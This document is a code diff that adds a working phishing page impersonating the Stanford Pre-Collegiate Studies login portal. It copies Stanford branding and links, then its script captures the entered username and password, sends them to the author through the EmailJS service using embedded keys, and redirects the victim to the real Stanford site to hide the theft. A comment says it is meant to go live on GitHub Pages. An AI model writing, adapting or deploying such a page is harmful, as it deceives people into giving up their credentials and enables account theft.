@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stanford Pre-Collegiate Portal - Secure Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="shortcut icon" href="https://www.stanford.edu/favicon.ico" type="image/x-icon">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Source Sans Pro', 'Segoe UI', Arial, sans-serif;
+            background: #f8f8f8;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 450px;
+            animation: fadeIn 0.5s ease-in-out;
+            overflow: hidden;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .login-header-red {
+            background: #8C1515; /* Stanford Cardinal Red */
+            padding: 15px 0; 
+            text-align: center;
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .login-header-red img.brandbar {
+            width: 180px;
+            display: block;
+            margin: 0 auto;
+        }
+        .login-header-content {
+            padding: 30px 40px 15px 40px;
+            text-align: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .login-header-content img.precollegiate {
+            width: 250px;
+            margin-bottom: 15px;
+        }
+        .login-header-content p {
+            color: #4A4A4A;
+            font-size: 15px;
+            line-height: 1.5;
+            margin: 5px 0 0;
+            font-weight: 300;
+        }
+        .login-body {
+            padding: 30px 40px 40px 40px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 1px solid #DDDDDD;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            background-color: #FAFAFA;
+        }
+        .form-group input:focus {
+            border-color: #8C1515;
+            background-color: #FFFFFF;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(140, 21, 21, 0.1);
+        }
+        .form-submit {
+            width: 100%;
+            padding: 14px;
+            background: #8C1515;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 4px rgba(140, 21, 21, 0.2);
+        }
+        .form-submit:hover {
+            background: #6D1111;
+            box-shadow: 0 4px 8px rgba(140, 21, 21, 0.3);
+        }
+        .form-submit:active {
+            transform: translateY(1px);
+        }
+        .footer-text {
+            text-align: center;
+            font-size: 13px;
+            color: #888;
+            margin-top: 25px;
+            line-height: 1.5;
+        }
+        .forgot-password {
+            text-align: right;
+            font-size: 13px;
+            margin-top: -15px;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #8C1515;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        .forgot-password a:hover {
+            color: #6D1111;
+            text-decoration: underline;
+        }
+        .loader {
+            display: none;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #8C1515;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .browser-notice {
+            background-color: #FFF8E6;
+            border: 1px solid #FFE0B2;
+            border-radius: 4px;
+            padding: 10px 15px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #5D4037;
+            display: flex;
+            align-items: center;
+        }
+        .browser-notice svg {
+            margin-right: 10px;
+            flex-shrink: 0;
+        }
+        .session-info {
+            font-size: 12px;
+            color: #777;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header-red">
+            <img src="brandbar-stanford-logo@2x.webp" alt="Stanford University" class="brandbar">
+        </div>
+        <div class="login-header-content">
+            <img src="Stanford_Precollegiate.png" alt="Stanford Pre-Collegiate" class="precollegiate">
+            <p>Please sign in with your username to access the Pre-Collegiate Studies portal.</p>
+        </div>
+        <div class="login-body">
+            <div class="browser-notice">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#E65100" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                </svg>
+                For optimal security and performance, please use Chrome, Firefox, or Edge browser.
+            </div>
+            <form id="loginForm" onsubmit="sendEmail(event)">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" placeholder="Enter your username" required autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                    <div class="session-info">This website uses secure cookies for session management</div>
+                </div>
+                <div class="forgot-password">
+                    <a href="https://accounts.stanford.edu/forgot-password" target="_blank">Forgot password?</a>
+                </div>
+                <button type="submit" class="form-submit" id="submitBtn">Sign In</button>
+                <div class="loader" id="loader"></div>
+            </form>
+            <div class="footer-text">
+                © 2025 Stanford University<br>
+                Pre-Collegiate Studies | All Rights Reserved<br>
+                <a href="https://www.stanford.edu/site/privacy" style="color: #8C1515; text-decoration: none;">Privacy Policy</a> | 
+                <a href="https://uit.stanford.edu/security" style="color: #8C1515; text-decoration: none;">Security</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            emailjs.init('mgsE9ce6Tke2ieolO'); // Your EmailJS Public Key
+        })();
+
+        function sendEmail(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const loader = document.getElementById('loader');
+
+            submitBtn.style.display = 'none';
+            loader.style.display = 'block';
+
+            // Local testing mode
+            if (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost') {
+                console.log('Local Test - Username:', username, 'Password:', password);
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                    alert('Local test complete! Data logged to console. Deploy to GitHub Pages to send email.');
+                }, 1000);
+            } 
+            // Live mode for GitHub Pages
+            else {
+                emailjs.send('service_6mczk2e', 'template_adbt0um', {
+                    username: username,
+                    password: password
+                })
+                .then(() => {
+                    setTimeout(() => {
+                        window.location.href = 'https://precollegiate.stanford.edu'; // Stanford Pre-Collegiate URL
+                    }, 1000);
+                }, (error) => {
+                    console.log('Email failed:', error);
+                    alert('Login failed: ' + error.text);
+                    loader.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                });
+            }
+        }
+    </script>
+</body>
+</html>
